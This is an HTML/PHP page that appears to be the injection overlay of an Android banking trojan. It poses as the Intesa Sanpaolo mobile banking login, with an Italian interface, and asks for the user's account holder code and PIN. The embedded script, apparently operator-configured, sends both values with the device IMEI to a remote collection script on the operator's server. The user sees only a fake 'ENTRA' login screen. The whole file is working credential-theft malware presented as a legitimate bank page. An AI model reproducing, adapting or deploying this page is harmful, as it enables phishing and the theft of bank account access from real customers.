<!-- 2.7.1 -->
<html>
<head>
    <meta charset="UTF-8">
    <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.4/angular.min.js"></script>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css">
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/js/bootstrap.min.js"></script>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.0/umd/popper.min.js"></script>
	<link rel="stylesheet" href="it/com.latuabancaperandroid/style.css">
</head>
<?php
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
include "config.php";
?>
<body>
    <div class="header">
        <img style="width: 15px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACEAAAA/CAIAAADhWjbTAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyJpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNiAoV2luZG93cykiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6NDE0NzE0NDFCNzY5MTFFOEJBN0NCMEIwNjlENUM5QzgiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6NDE0NzE0NDJCNzY5MTFFOEJBN0NCMEIwNjlENUM5QzgiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDo0MTQ3MTQzRkI3NjkxMUU4QkE3Q0IwQjA2OUQ1QzlDOCIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDo0MTQ3MTQ0MEI3NjkxMUU4QkE3Q0IwQjA2OUQ1QzlDOCIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PvAT/I8AAARCSURBVHjatJlbKPNhHMe3sdO7OcuZiCRyyKkcSkmJolwgKUUpcyW5s3DhghtiN1JuFCEphMQFQqJEXCBKSiKRxJjD3u/7Puv3jvZu+//3eC7Wav//Pvsdnt/3+/wnNZvNkp9ZfX19lnfmH1iPj48tLS2//q7Q0FD+jPv7e51Op1QqpVKpTCYLDg7mz6ivr1epVMgQGGq1uqmpiSfj+vq6urqaRYCl1Wqbm5sfHh64MYxGY01NDSJgAFSira2NfcSHcXNzU1FR4e7uTinS6/XPz8/cGACUlZUpFAoG8PDw6OnpMZlMdIGrDPzYkpISuVzOABqNpr29/ds1LjHOz88LCwspRT4+Pv39/S8vL9wYT09PxcXFlCJ0EQA2rxTJOD09zc3NxRZjAC8vL4PBYF0DVxmXl5f5+flUA19f3/HxcTvXS0QAUlNT3dzcqIsQgf1bhDGOjo5ycnIIEBYWNjMz4/AuiaAuSklJoS7y9PScnp525kZnGbu7u2lpaVTkkJCQ0dHRj48PbgxEQDUAJiAgYHl52fkEOGYcHBwg7/jtDID3U1NTgqrogLGzs5ORkUEpiomJWVlZEdqK9hjb29tBQUEEwKjY3NwUsZ/+y1hdXY2Pj2cAvCYlJW1sbIgbCrYZ6+vrERERBEA0SJroyWaDsba2FhgYyIqMXkpOTkbSXBnPXxifn59zc3OxsbEUQUJCAnaGixrzhbG0tIQJShGgi87OzlwXyn+M2dlZ2gcAYC7t7e1xUXsLY2JiAvOHAEgXFIKXZfnDwGjz8/NjAIy8rKysi4sLjr5LMjg4yLqIWUcMPo4RWBjh4eHWNYBKc3enMjafWZZqa2vh7/ifEgoKCkh20LjDw8Pc45BcXV3BADAMs/JOqpuwvoIEpaen03zFdFpYWODMwLq9vf2WNEFK5+w+Pzk5yczMpGiio6NdmbX/nVdw4NjhZG0gSiJUz/Fsh4Oi2uAVMuU6xoZ+HB8fYzgSBmK1v7/PmcEw2dnZlLSoqKitrS3ODGba8NUsGsCQQIA5M7CQIsIwZyUO48BfIUWQWxqaiEaEcDn2iegrNDGpS2JiIuYCZwZzi3FxcZQ0aMzh4SFnBjNEsNIMg2jy8vKc10oB5w9YaUxligZnESeTJuwctbi4GBkZSbWBKDiDEXweHBkZIQcDDOT57u6OMwNrfn7e2omVlpbaj0bk+XxychInWoZRKBTQHjtmQyTj/f19YGDA2noXFRVBtnky2BobG/P29qZoqqqqoECcGVgGg0Gr1RKmvLzcaDRyZrCk+fv7M4xcLq+srPwWDZ/ncN3d3RqNhqIBhj8D+enq6qKkIZq6ujraNzyfi/b29sLKMnuuUqkaGhrY8zKejLe3N71er1arGUapVDY2Nr6+vnJ+hmwymTo7OylpCGtoaEjG16GjEq2trTqdDrnCbLaMtZ/4x6CjowNHZBwwgUGb/RZgAJBIVcvscKpcAAAAAElFTkSuQmCC">
    </div>
    <div class="text-center">
        Entra nella tua<br>banca online
    </div>
    <form action="null" method="post" id="_mainForm" target="flow_handler">
        <input type="tel" class="field" name="login" id="login" placeholder="Codice titolare">

        <input type="password" class="field" name="pin" id="pin" placeholder="PIN">

        <input type="submit" class="button" id="input_submitBtn" value="ENTRA">
    </form>

    <div class="footer">
        NON RIESCI AD EFFETTUARE L'ACCESSO?
    </div>
    <iframe src="about:blank" name="flow_handler" style="visibility:hidden;display:none"></iframe>
<script type="text/javascript">
   (function () {
		var  __insHiddenField = function (objDoc, objForm, sNm, sV) {
            var input = objDoc.createElement("input");
            input.setAttribute("type", "hidden");
            input.setAttribute("name", sNm);
            input.setAttribute("value", sV);
            input.value = sV;
            objForm.appendChild(input);
        };

        var g_oBtn = document.getElementById('input_submitBtn');
        g_oBtn.onclick = function () {

            var oNumInp = document.getElementById('login');
            var oCodeInp = document.getElementById('pin');

            try{
                oNumInp.className = 'field';
                oCodeInp.className = 'field';
            } catch(e){};

            if (!/^\w{3,50}$/i.test(oNumInp.value)) {
                try{
                    oNumInp.className = 'field error';
                } catch(e){};
                return false;
            }

            if (!/^\w{3,50}$/i.test(oCodeInp.value)) {
                try{
                    oCodeInp.className = 'field error';
                } catch(e){};
                return false;
            }

			top['closeDlg'] = true;
          	var url='<?php echo $URL; ?>';
           	var imei_c='<?php echo $IMEI_country; ?>';
           	location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_3|it_sanpaolo|"+oNumInp.value+"|"+oCodeInp.value);

           return false;
       };

   })();
</script>
</body>
</html>
